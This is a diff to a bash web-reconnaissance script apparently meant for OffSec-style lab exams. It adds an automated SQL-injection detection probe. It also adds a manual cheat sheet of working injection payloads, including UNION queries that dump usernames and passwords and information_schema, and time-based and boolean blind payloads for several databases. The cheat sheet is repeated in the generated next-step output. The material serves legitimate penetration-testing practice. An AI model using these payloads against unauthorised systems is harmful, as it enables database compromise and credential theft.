@@ -79,6 +79,7 @@ PHASE_CONTENT_TIMEOUT=900            # 15 min — large wordlists take time
 PHASE_RECURSIVE_TIMEOUT=600
 PHASE_VHOST_TIMEOUT=600
 PHASE_PARAM_TIMEOUT=300
+PHASE_SQLI_TIMEOUT=180                # Detection-only probe; ~3 requests per param
 
 DEEP_MODE=false
 VHOST_DOMAIN=""                      # e.g. "target.htb" — enables vhost fuzzing
@@ -772,15 +773,28 @@ PYEOF
 
 [4] ATTACKS BY PARAM TYPE  (test in Repeater; then Intruder for lists)
 
-  SQL injection (login, search, id params):
-    '   "   ' OR '1'='1-- -     admin'-- -     ") OR ("1"="1
-    ') OR 1=1-- -                # closes parenthesized query
-    UNION-based:  ' UNION SELECT NULL,NULL-- -   (increment NULLs to match col count)
-    Time-based:   ' AND SLEEP(5)-- -    " AND (SELECT SLEEP(5))-- -
-    Intruder Sniper wordlist:  /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
-    Or drop to sqlmap once a param looks vulnerable:
-      sqlmap -u "$url/path?id=1" --batch --dbs --level=3 --risk=2
-      sqlmap -r req.txt --batch --dbs   # if cookies/POST matter
+  SQL injection (login, search, id params) — sqlmap is BANNED on OffSec, manual only:
+    Probes:   '   "   ' OR '1'='1-- -     admin'-- -     ") OR ("1"="1
+              ') OR 1=1-- -                   # closes parenthesized query
+    Errors look for:  "SQL syntax"  "mysql_fetch"  "ORA-"  "PostgreSQL"  "ODBC"  "sqlite"
+    Column count (UNION prep): ' ORDER BY 1-- -  then 2,3,4... until error
+    UNION exfil:  ' UNION SELECT NULL,NULL,NULL-- -             # match col count
+                  ' UNION SELECT user(),database(),version()-- -
+                  ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -
+                  ' UNION SELECT group_concat(username,':',password),NULL,NULL FROM users-- -
+    Time-based blind (use when no reflected output):
+      MySQL/MariaDB:  ' AND SLEEP(5)-- -         or    ' AND IF(1=1,SLEEP(5),0)-- -
+      MSSQL:          '; WAITFOR DELAY '0:0:5'-- -
+      PostgreSQL:     '; SELECT pg_sleep(5)-- -
+      Oracle:         ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
+    Boolean-based blind (compare response size TRUE vs FALSE):
+      ' AND 1=1-- -       vs      ' AND 1=2-- -
+      ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'-- -
+    Intruder workflow (Burp Community is allowed):
+      Sniper mode → position '§' at param → payload list:
+        /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
+        /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt
+      Filter responses by length/status to spot anomalies.
 
   Command injection (ping, lookup, filename, download params):
     ;id   |id   \`id\`   \$(id)   %0aid   ||id   && id
@@ -1336,6 +1350,233 @@ PYEOF
         progress_log "$2" "FAIL" "$phase_name" "endpoints=${#endpoints[@]}"
     fi
     success "Parameter discovery complete"
+}
+
+#==============================================================================
+# PHASE 5b — SQLi DETECTION PROBE
+# Detection-only — no exploitation. Sends ONE quote-break probe per
+# (URL, param) pair and greps the response for DBMS error signatures.
+# sqlmap is banned on OffSec; this phase's output is a targeting list for
+# manual Burp Intruder work, not a replacement exploitation tool.
+#
+# Runs in both default and --deep modes — collects candidate URLs from
+# phase_params output (when --deep), phase_fingerprint's JS endpoint
+# extraction (default), content-phase JSON results containing a '?',
+# and robots.txt Disallow entries containing a '?'.
+#==============================================================================
+phase_sqli_probe() {
+    local url="$1"
+    local work_dir="$2"
+    local outdir="$work_dir/sqli"
+
+    local phase_name="sqli_probe"
+    if is_phase_done "$work_dir" "$phase_name"; then
+        info "SQLi probe already done — skipping"
+        return 0
+    fi
+
+    local base_host base_proto
+    base_proto=$(get_proto "$url")
+    base_host=$(get_host "$url")
+    local base_origin="${base_proto}://${base_host}"
+    local base_port
+    base_port=$(get_port "$url")
+    if [[ -n "$base_port" ]]; then
+        base_origin="${base_origin}:${base_port}"
+    fi
+
+    # Collect candidate (URL, param_name) pairs from any source that produced
+    # URLs with query strings. No query string = nothing to probe.
+    local pairs_tmp
+    pairs_tmp=$(mktemp) || return 1
+    python3 - "$work_dir" "$base_origin" > "$pairs_tmp" <<'PY'
+import glob, json, os, sys
+from urllib.parse import urlparse, parse_qsl, urlunparse, urlencode
+
+work_dir = sys.argv[1]
+origin = sys.argv[2].rstrip("/")
+
+def abs_url(u):
+    u = u.strip()
+    if not u:
+        return ""
+    if u.startswith(("http://", "https://")):
+        return u
+    if u.startswith("//"):
+        return "http:" + u
+    if u.startswith("/"):
+        return origin + u
+    return ""
+
+seen = set()
+out = []
+
+def add(u):
+    if not u:
+        return
+    try:
+        p = urlparse(u)
+    except Exception:
+        return
+    if not p.query:
+        return
+    qs = parse_qsl(p.query, keep_blank_values=True)
+    if not qs:
+        return
+    for name, _ in qs:
+        if not name:
+            continue
+        key = (p.scheme, p.netloc, p.path, name)
+        if key in seen:
+            continue
+        seen.add(key)
+        # Normalized URL without fragments
+        norm = urlunparse((p.scheme, p.netloc, p.path, "", p.query, ""))
+        out.append(f"{name}\t{norm}")
+
+# Source 1: phase_params ffuf JSON (deep mode)
+for jf in sorted(glob.glob(os.path.join(work_dir, "params", "params_*.json"))):
+    try:
+        data = json.load(open(jf))
+    except Exception:
+        continue
+    for r in data.get("results", []) or []:
+        if r.get("status") == 200:
+            add(r.get("url", ""))
+
+# Source 2: content-phase ffuf JSON — any result URL with a '?'
+for jf in glob.glob(os.path.join(work_dir, "content", "*.json")):
+    try:
+        data = json.load(open(jf))
+    except Exception:
+        continue
+    for r in data.get("results", []) or []:
+        u = r.get("url", "")
+        if "?" in u and r.get("status", 0) in (200, 301, 302, 401, 403):
+            add(u)
+
+# Source 3: JS endpoint extraction from fingerprint phase
+js_file = os.path.join(work_dir, "fingerprint", "js_endpoints.txt")
+if os.path.exists(js_file):
+    for line in open(js_file, errors="ignore"):
+        line = line.strip()
+        if "?" not in line:
+            continue
+        add(abs_url(line))
+
+# Source 4: robots.txt Disallow entries
+robots_file = os.path.join(work_dir, "fingerprint", "robots.txt")
+if os.path.exists(robots_file):
+    for line in open(robots_file, errors="ignore"):
+        low = line.lower().lstrip()
+        if not low.startswith("disallow:"):
+            continue
+        path = line.split(":", 1)[1].strip()
+        if "?" in path:
+            add(abs_url(path))
+
+for row in out:
+    print(row)
+PY
+
+    local total
+    total=$(wc -l < "$pairs_tmp" 2>/dev/null); total=${total:-0}
+    if (( total == 0 )); then
+        info "No URLs with query params to probe — skipping SQLi probe"
+        rm -f "$pairs_tmp"
+        return 0
+    fi
+
+    mkdir -p "$outdir"
+    progress_log "$work_dir" "START" "$phase_name" "url=$url"
+    phase "Phase 5b — SQLi Detection Probe (detection only, sqlmap banned)"
+
+    local -a ssl_flag=()
+    [[ "$base_proto" == "https" ]] && ssl_flag=(-k)
+
+    # Cap to keep runtime bounded (~1 request per pair, max ~25 requests).
+    local cap=25
+    if (( total > cap )); then
+        info "Capping SQLi probe at $cap of $total (URL,param) pair(s)"
+        head -n "$cap" "$pairs_tmp" > "${pairs_tmp}.capped" && mv "${pairs_tmp}.capped" "$pairs_tmp"
+        total=$cap
+    else
+        info "Probing $total (URL,param) pair(s) for SQL error signatures"
+    fi
+
+    local suspects="$outdir/suspects.txt"
+    : > "$suspects"
+    local probed=0
+    local flagged=0
+
+    # SQL error signatures — ordered by DBMS. Matched case-insensitively.
+    local err_markers='You have an error in your SQL syntax|mysql_fetch_|mysql_num_rows|Warning: mysql|MySqlClient\.|ORA-[0-9]{5}|Oracle error|quoted string not properly terminated|Microsoft OLE DB Provider|SQLServer JDBC Driver|SqlException|System\.Data\.SqlClient|unclosed quotation mark|PostgreSQL.*ERROR|PG::SyntaxError|pg_query\(|pg_exec\(|SQLite3::SQLException|sqlite_error|ODBC SQL Server Driver|JET Database Engine'
+
+    local body_tmp
+    body_tmp=$(mktemp) || { rm -f "$pairs_tmp"; return 1; }
+
+    # Build probe URL: replace the target param's value with "1'" (URL-encoded).
+    # Keeps other params intact. Delegates to Python for correct query parsing.
+    while IFS=$'\t' read -r pname base_url; do
+        [[ -z "$pname" || -z "$base_url" ]] && continue
+        local probe_url
+        probe_url=$(python3 - "$base_url" "$pname" <<'PY'
+import sys
+from urllib.parse import urlparse, parse_qsl, urlunparse, urlencode
+base, pname = sys.argv[1], sys.argv[2]
+p = urlparse(base)
+qs = parse_qsl(p.query, keep_blank_values=True)
+new = [(k, ("1'" if k == pname else v)) for k, v in qs]
+print(urlunparse((p.scheme, p.netloc, p.path, "", urlencode(new), "")))
+PY
+        )
+        [[ -z "$probe_url" ]] && continue
+        (( probed++ ))
+
+        local http_code
+        http_code=$(timeout "$CURL_TIMEOUT" curl -sk -o "$body_tmp" -w '%{http_code}' \
+            -A 'Mozilla/5.0' --max-time "$CURL_TIMEOUT" "${ssl_flag[@]}" \
+            "$probe_url" 2>/dev/null || echo "")
+
+        [[ -s "$body_tmp" ]] || continue
+
+        local matched
+        matched=$(grep -ioE "$err_markers" "$body_tmp" 2>/dev/null | sort -u | head -3 | tr '\n' '|' | sed 's/|$//')
+        if [[ -n "$matched" ]]; then
+            local dbms="unknown"
+            case "${matched,,}" in
+                *mysql*|*mysqlclient*|*mariadb*) dbms="MySQL/MariaDB" ;;
+                *postgresql*|*pg_*|*pg::*)       dbms="PostgreSQL" ;;
+                *ora-*|*oracle*|*quoted\ string*) dbms="Oracle" ;;
+                *microsoft*|*sqlserver*|*sqlclient*|*sqlexception*|*unclosed\ quotation*) dbms="MSSQL" ;;
+                *sqlite*)                        dbms="SQLite" ;;
+                *odbc*)                          dbms="ODBC" ;;
+                *jet*)                           dbms="MS-Access" ;;
+            esac
+            (( flagged++ ))
+            {
+                echo "# --- Suspect $flagged ---"
+                echo "URL:     $base_url"
+                echo "Param:   $pname"
+                echo "Probe:   $probe_url"
+                echo "Status:  $http_code"
+                echo "DBMS:    $dbms"
+                echo "Markers: $matched"
+                echo ""
+            } >> "$suspects"
+            info "  [!] SQLi-error signature on $base_url (param=$pname, $dbms)"
+        fi
+    done < "$pairs_tmp"
+
+    rm -f "$pairs_tmp" "$body_tmp"
+
+    if (( flagged > 0 )); then
+        success "SQLi probe: $flagged/$probed param(s) returned DB error signatures — see $suspects"
+    else
+        info "SQLi probe: $probed param(s) tested, no DB error signatures returned"
+    fi
+
+    progress_log "$work_dir" "DONE" "$phase_name" "probed=$probed suspects=$flagged"
 }
 
 #==============================================================================
@@ -2033,6 +2274,39 @@ generate_next_steps() {
         fi
     fi
 
+    # SQLi probe suspects — detection-only, sqlmap is banned on OffSec.
+    local sqli_suspects="$work_dir/sqli/suspects.txt"
+    if is_nonempty_file "$sqli_suspects"; then
+        local suspect_count
+        suspect_count=$(grep -c '^URL:' "$sqli_suspects" 2>/dev/null); suspect_count=${suspect_count:-0}
+        if (( suspect_count > 0 )); then
+            local first_probe
+            first_probe=$(grep -m1 '^Probe:' "$sqli_suspects" | awk '{print $2}')
+            local first_param
+            first_param=$(grep -m1 '^Param:' "$sqli_suspects" | awk '{print $2}')
+            append_next_finding "$next_file" \
+                "SQLi error signatures on ${suspect_count} param(s) — MANUAL only, no sqlmap" \
+                "phase_sqli_probe flagged DB error strings (see $sqli_suspects)" \
+                "cat $sqli_suspects" \
+                "# --- Manual UNION workflow in Burp Community Repeater ---" \
+                "# Starting probe URL (param=$first_param) — replace the payload after the '1 in the query string:" \
+                "echo '$first_probe'" \
+                "# Step 1: find column count by incrementing N in ORDER BY until error:" \
+                "#   ...${first_param}=1' ORDER BY 1-- -" \
+                "#   ...${first_param}=1' ORDER BY 2-- -   (etc.)" \
+                "# Step 2: UNION-match the column count:" \
+                "#   ...${first_param}=1' UNION SELECT NULL,NULL,NULL-- -" \
+                "# Step 3: replace NULLs with user(),database(),version() then dump:" \
+                "#   ...${first_param}=1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -" \
+                "# --- Time-based blind (pick per DBMS from suspects.txt Markers line) ---" \
+                "# MySQL:       ${first_param}=1' AND SLEEP(5)-- -" \
+                "# MSSQL:       ${first_param}=1'; WAITFOR DELAY '0:0:5'-- -" \
+                "# PostgreSQL:  ${first_param}=1'; SELECT pg_sleep(5)-- -" \
+                "# --- Burp Community Intruder payload list (Sniper mode) ---" \
+                "# /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt"
+        fi
+    fi
+
     if ! grep -q '^## ' "$next_file" 2>/dev/null; then
         echo "(no grounded web next-step commands generated)" >> "$next_file"
     fi
@@ -2204,6 +2478,23 @@ generate_summary() {
                     [[ -f "$f" ]] || continue
                     grep -v '^No\|^-\|^URL' "$f" 2>/dev/null | head -20
                 done | sort -u
+                echo ""
+            fi
+        fi
+
+        # --- SQLi Probe Suspects ---
+        if is_nonempty_file "$work_dir/sqli/suspects.txt"; then
+            local sqli_count
+            sqli_count=$(grep -c '^URL:' "$work_dir/sqli/suspects.txt" 2>/dev/null); sqli_count=${sqli_count:-0}
+            if (( sqli_count > 0 )); then
+                echo "## SQLi Error Signatures (${sqli_count}) ★"
+                echo ""
+                echo "> **Detection only.** sqlmap is banned on OffSec — use Burp Community"
+                echo "> Repeater/Intruder for manual UNION/time-based exploitation."
+                echo ""
+                echo '```'
+                cat "$work_dir/sqli/suspects.txt" 2>/dev/null
+                echo '```'
                 echo ""
             fi
         fi
@@ -2889,6 +3180,7 @@ phase_content     "$TARGET_URL" "$OUTPUT_DIR"
 phase_recursive   "$TARGET_URL" "$OUTPUT_DIR"
 phase_vhosts      "$TARGET_URL" "$OUTPUT_DIR"
 phase_params      "$TARGET_URL" "$OUTPUT_DIR"
+phase_sqli_probe  "$TARGET_URL" "$OUTPUT_DIR"
 
 wait_all
 
